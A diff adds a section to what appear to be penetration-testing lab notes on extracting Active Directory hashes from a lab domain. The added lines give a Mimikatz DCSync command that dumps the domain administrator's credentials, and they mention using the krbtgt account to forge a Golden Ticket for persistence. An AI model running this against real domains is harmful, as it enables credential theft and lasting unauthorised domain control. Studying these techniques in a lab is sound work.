@@ -234,3 +234,10 @@ ls inlanefreight_hashes*
 
 inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
 ```
+
+#### Windows 
+- Using Mimikatz, we must target a specific user
+- We could also target the krbtgt account and use this to create a Golden Ticket for persistence
+```
+.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
+```
